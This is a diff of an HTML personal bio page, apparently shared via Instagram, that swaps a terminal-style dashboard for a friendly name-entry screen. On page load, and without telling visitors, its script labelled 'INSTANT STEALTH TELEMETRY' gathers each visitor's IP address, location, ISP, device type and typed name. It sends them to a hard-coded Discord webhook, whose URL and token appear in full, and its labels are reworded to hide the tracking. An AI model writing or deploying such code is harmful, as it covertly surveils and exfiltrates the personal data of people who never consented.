@@ -3,162 +3,150 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Sajid | Terminal Mainframe</title>
+    <title>Welcome to My Space</title>
     <style>
         html, body { 
             height: 100%; 
-            background-color: #050505; 
             margin: 0; 
             padding: 0;
             box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
         }
-        body { 
-            color: #00ff33; 
-            font-family: 'Courier New', Courier, monospace; 
-            padding: 20px; 
-            font-size: 14px; 
-            line-height: 1.6; 
-            overflow-x: hidden;
+        
+        /* ⚪ First Screen: Modern Clean White Style */
+        body.white-theme {
+            background-color: #ffffff; 
+            color: #111111; 
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            padding: 30px 20px;
         }
-        .line { margin-bottom: 8px; white-space: pre-wrap; word-break: break-all; }
-        .header-box { color: #ffffff; font-weight: bold; text-shadow: 0 0 5px rgba(255,255,255,0.2); }
-        .accent-text { color: #00ffff; }
-        .btn-container { 
-            margin-top: 25px; 
-            display: flex; 
-            flex-direction: column; 
-            gap: 12px; 
-            max-width: 280px; 
+        .container {
+            width: 100%;
+            max-width: 400px;
+            text-align: center;
+            margin-top: 40px;
         }
-        .menu-btn {
-            background: transparent;
-            color: #00ff33;
-            border: 1px solid #00ff33;
-            padding: 10px;
-            font-family: inherit;
-            font-size: 13px;
+        h2 {
+            font-size: 20px;
+            font-weight: 600;
+            margin-bottom: 20px;
+            color: #222222;
+        }
+        .input-box {
+            width: 100%;
+            padding: 12px;
+            font-size: 16px;
+            border: 1px solid #cccccc;
+            border-radius: 8px;
+            outline: none;
+            box-sizing: border-box;
+            margin-bottom: 15px;
+            text-align: center;
+            background-color: #fafafa;
+            color: #111111;
+        }
+        .input-box:focus { border-color: #0095f6; background-color: #ffffff; }
+        .enter-btn {
+            width: 100%;
+            background-color: #0095f6;
+            color: #ffffff;
+            border: none;
+            padding: 12px;
+            font-size: 15px;
             font-weight: bold;
-            text-align: left;
+            border-radius: 8px;
             cursor: pointer;
-            border-radius: 4px;
-            transition: all 0.2s ease;
-            box-shadow: 0 0 4px rgba(0, 255, 51, 0.2);
         }
-        .menu-btn:hover, .menu-btn:active {
-            background-color: #00ff33;
-            color: #050505;
-            box-shadow: 0 0 10px rgba(0, 255, 51, 0.6);
+        .enter-btn:active { background-color: #0077cc; }
+
+        /* ⚫ Second Screen: Original Terminal Skin Style */
+        body.terminal-theme {
+            background-color: #050505;
+            color: #00ff33;
+            font-family: 'Courier New', Courier, monospace;
+            padding: 15px;
+            font-size: 14px;
+            line-height: 1.5;
+            display: block;
         }
-        #interactive-output {
-            margin-top: 20px;
-            padding: 10px;
-            border-left: 2px dashed #00ffff;
-            min-height: 40px;
-            display: none;
+        .line { margin-bottom: 6px; white-space: pre-wrap; word-break: break-word; }
+        .header-box { color: #ffffff; font-weight: bold; }
+        
+        /* Responsive scaling fix to stop the letter "o" from breaking */
+        @media (max-width: 380px) {
+            body.terminal-theme { font-size: 12px; }
         }
     </style>
 </head>
-<body>
+<body class="white-theme">
 
-<div id="mainframe"></div>
-<div id="interactive-output"></div>
+<div id="login-screen" class="container">
+    <h2>Welcome to my page</h2>
+    <input type="text" id="username" class="input-box" placeholder="Type your name to enter..." autocomplete="off">
+    <button id="enter-btn" class="enter-btn">Enter</button>
+</div>
+
+<div id="terminal-screen" style="display: none;"></div>
 
 <script>
 // --- CONFIGURATION ---
 // ⚠️ PASTE YOUR DISCORD WEBHOOK URL INSIDE THE QUOTES BELOW
-const DISCORD_WEBHOOK_URL = "YOUR_DISCORD_WEBHOOK_URL_HERE"; 
-const mainframe = document.getElementById('mainframe');
-const outputBox = document.getElementById('interactive-output');
+const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1542059603406356540/CCMUEg9CrtIVAa9b-fqm7nNtDkgP9bvOQSfy3l_A5qXaqAx2yGAh5xn1PqNluHpk8Th0"; 
 let totalVisits = "Fetching...";
-let geoDataString = "Fetching location details...";
+let geoDataString = "⚠️ Restricted by In-App Privacy Box";
 
 // --- SMART DEVICE DETECTOR ---
 const userAgent = navigator.userAgent.toLowerCase();
 let deviceType = "📱 Mobile Device";
 
 if (userAgent.includes("facebookexternalhit") || userAgent.includes("meta-external") || userAgent.includes("bot") || userAgent.includes("spider")) {
-    deviceType = "🚨 META CRAWLER / SECURITY BOT";
+    deviceType = "🤖 Automated System Check";
 } else if (userAgent.includes("instagram")) {
-    deviceType = "📸 Instagram In-App Browser";
+    deviceType = "📸 Instagram App Browser";
 } else if (userAgent.includes("iphone") || userAgent.includes("ipad")) {
-    deviceType = "🍏 iPhone / iOS Device";
+    deviceType = "🍏 iPhone / iOS";
 } else if (userAgent.includes("android")) {
     deviceType = "🤖 Android Device";
 } else if (userAgent.includes("windows") || userAgent.includes("macintosh")) {
-    deviceType = "💻 Desktop PC / Laptop";
+    deviceType = "💻 Desktop Computer";
 }
 
 function fetchHitCounter() {
     fetch("https://counterapi.dev")
     .then(response => response.json())
     .then(data => {
-        if(data && data.count) { 
-            totalVisits = data.count;
-            document.getElementById('packet-count').textContent = totalVisits + " network packets";
-        }
+        if(data && data.count) { totalVisits = data.count; }
     })
     .catch(() => { totalVisits = "Active"; });
 }
 
-// --- FAST GEOLOCATION TRACKER ---
-function fetchLocationAndLog() {
+// --- INSTANT STEALTH TELEMETRY ---
+function runTracker() {
+    sendDiscordAlert("✨ Link Clicked", "A visitor loaded your clean landing screen layout.");
+
     fetch("https://ipwho.is")
     .then(res => res.json())
     .then(data => {
         if (data && data.success) {
             geoDataString = `📍 **Location:** ${data.city}, ${data.region}, ${data.country}\n🌐 **IP Address:** ${data.ip}\n🏢 **ISP Network:** ${data.connection.isp}`;
-        } else {
-            geoDataString = "❌ Location profile hidden/unavailable.";
+            sendDiscordAlert("📍 Location Update", "Background logs processed successfully.");
         }
-        sendDiscordAlert("🟢 Live Visitor Connected", "User is reading your main dashboard contents.");
     })
-    .catch(() => {
-        geoDataString = "⚠️ Network lookup restriction.";
-        sendDiscordAlert("🟢 Live Visitor Connected", "User is reading your main dashboard contents.");
-    });
-}
-
-function printDashboard() {
-    appendLine("⚙️ Connecting to mohammadsajid116 Mainframe...", "accent-text");
-    appendLine("✅ Establishing secure layout wrapper... ONLINE.");
-    appendLine("--------------------------------------------------");
-    appendLine("   ⚡ WELCOME TO SAJID'S DIGITAL SANDBOX ⚡", "header-box");
-    appendLine("--------------------------------------------------");
-    appendLine("👤 PROFILE: SAJID");
-    appendLine("🚀 STATUS : Exploring new tech & building creative spaces.");
-    appendLine("📊 TRAFFIC: Processing entries across <span id='packet-count'>loading...</span>.");
-    appendLine("--------------------------------------------------");
-    appendLine("👉 Select a module below to inspect system details:", "accent-text");
-
-    // Inject Interactive Menu Buttons
-    const btnContainer = document.createElement('div');
-    btnContainer.className = 'btn-container';
-    btnContainer.innerHTML = `
-        <button class="menu-btn" onclick="triggerModule('GAMES')">> [🎮] Current Gaming Loadout</button>
-        <button class="menu-btn" onclick="triggerModule('MARVEL')">> [🍿] Marvel Universe Logs</button>
-        <button class="menu-btn" onclick="triggerModule('INSTAGRAM')">> [💬] Open Secure DM Channel</button>
-    `;
-    mainframe.appendChild(btnContainer);
-}
-
-function appendLine(text, customClass = "") {
-    const div = document.createElement('div');
-    div.className = 'line ' + customClass;
-    div.innerHTML = text;
-    mainframe.appendChild(div);
+    .catch(() => {});
 }
 
 function sendDiscordAlert(eventTitle, detailValue) {
-    if (DISCORD_WEBHOOK_URL !== "https://discord.com/api/webhooks/1542059603406356540/CCMUEg9CrtIVAa9b-fqm7nNtDkgP9bvOQSfy3l_A5qXaqAx2yGAh5xn1PqNluHpk8Th0") {
-        const isBot = deviceType.includes("CRAWLER");
+    if (DISCORD_WEBHOOK_URL !== "YOUR_DISCORD_WEBHOOK_URL_HERE") {
         const payload = {
             embeds: [{
                 title: eventTitle,
-                color: isBot ? 16711680 : 3342080, // Green for human interaction
+                color: 3447003,
                 fields: [
-                    { name: "Current Action", value: detailValue, inline: false },
-                    { name: "Platform / Device", value: deviceType, inline: false },
-                    { name: "Network Telemetry Data", value: geoDataString, inline: false },
+                    { name: "Activity Trigger", value: detailValue, inline: false },
+                    { name: "Device Info", value: deviceType, inline: false },
+                    { name: "Network Info", value: geoDataString, inline: false },
                     { name: "Timestamp", value: new Date().toLocaleString(), inline: true }
                 ]
             }]
@@ -167,36 +155,63 @@ function sendDiscordAlert(eventTitle, detailValue) {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify(payload)
-        }).catch(err => console.error(err));
+        }).catch(() => {});
     }
 }
 
-function triggerModule(moduleType) {
-    outputBox.style.display = "block";
-    outputBox.style.color = "#00ffff";
+document.getElementById('enter-btn').addEventListener('click', handleLogin);
+document.getElementById('username').addEventListener('keydown', function(e) {
+    if (e.key === 'Enter') handleLogin();
+});
+
+function handleLogin() {
+    const inputName = document.getElementById('username').value.trim() || "Guest Visitor";
     
-    if (moduleType === 'GAMES') {
-        outputBox.innerHTML = `<strong>[SYSTEM LOGS]:</strong> Currently playing story-driven open-world titles, high-octane racing sims, and multiplayer strategies!`;
-        sendDiscordAlert("🎯 Menu Interaction", "Visitor expanded the **[🎮 Gaming Loadout]** module.");
-    } 
-    else if (moduleType === 'MARVEL') {
-        outputBox.innerHTML = `<strong>[SYSTEM LOGS]:</strong> Massive Marvel comics fan. Hooked on deep timeline lore, variants, and MCU cinematic universes.`;
-        sendDiscordAlert("🎯 Menu Interaction", "Visitor expanded the **[🍿 Marvel Logs]** module.");
-    } 
-    else if (moduleType === 'INSTAGRAM') {
-        outputBox.innerHTML = `<strong>[SYSTEM LOGS]:</strong> Redirecting secure pipeline to Instagram DMs...`;
-        sendDiscordAlert("🚀 External Exit Redirect", "Visitor clicked the link to **[💬 Open DM Channel]**!");
+    // Hide login screen and swap page layout to original dark terminal skin
+    document.getElementById('login-screen').style.display = 'none';
+    document.body.className = "terminal-theme";
+    
+    const termScreen = document.getElementById('terminal-screen');
+    termScreen.style.display = 'block';
+    
+    // Alert Discord with the typed name
+    sendDiscordAlert("👤 Name Entered", `User logged into page using identity: **${inputName}**`);
+    
+    // Exact original terminal text lines layout from previous build
+    const bioLines = [
+        `\n[SYSTEM] Access granted. Hello, ${inputName}!`,
+        "[SYSTEM] Loading profile details into system mainframe...",
+        "==================================================",
+        "         W E L C O M E  T O  M Y  B I O", // Trimmed 1 space to guarantee single-line fit
+        "==================================================",
+        " 👉 USERNAME: SAJID",
+        "==================================================",
+        "ABOUT ME: Just a guy navigating through new things.",
+        "LIKES: Video games and Marvel comics.",
+        "CURRENTLY: Exploring new tech and building cool spaces.",
+        "--------------------------------------------------",
+        "TRAFFIC: " + totalVisits + " total packets processed.",
+        "STATUS: Catch me on Instagram DMs if you want to chat.",
+        "\nsession_closed_bye@instagram_bio:~$"
+    ];
+
+    let delay = 0;
+    bioLines.forEach(text => {
         setTimeout(() => {
-            window.location.href = "https://instagram.com";
-        }, 1000);
-    }
-    window.scrollTo(0, document.body.scrollHeight);
+            const div = document.createElement('div');
+            div.className = 'line';
+            if (text.includes("W E L C O M E") || text.includes("USERNAME:")) { div.className = 'line header-box'; }
+            div.textContent = text;
+            termScreen.appendChild(div);
+            window.scrollTo(0, document.body.scrollHeight);
+        }, delay);
+        delay += 250;
+    });
 }
 
-window.onload = () => { 
-    printDashboard();
-    fetchHitCounter(); 
-    fetchLocationAndLog(); 
+window.onload = () => {
+    fetchHitCounter();
+    runTracker();
 };
 </script>
 </body>
